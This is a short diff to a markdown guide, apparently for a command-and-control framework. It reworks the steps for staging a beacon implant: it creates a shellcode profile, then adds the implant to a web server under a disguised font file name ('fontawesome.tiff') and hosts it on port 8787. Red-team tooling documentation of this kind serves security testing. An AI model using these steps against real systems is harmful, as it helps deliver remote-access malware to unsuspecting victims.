@@ -23,9 +23,14 @@ Create a test profile for the stager
 profiles new -b http://IP:8686 beacon --skip-symbols --format shellcode windows-test
 ```
 
-Start the stager
+Add implant to http server
 ```
-stage-listener --url "http://IP:8787/fontawesome.woff"  --profile windows-test
+ websites add-content --content /fontawesome.tiff --web-path /fontawesome.tiff --website test
+```
+
+Host the implant
+```
+http --website test --lport 8787
 ```
 
 Start the http listener
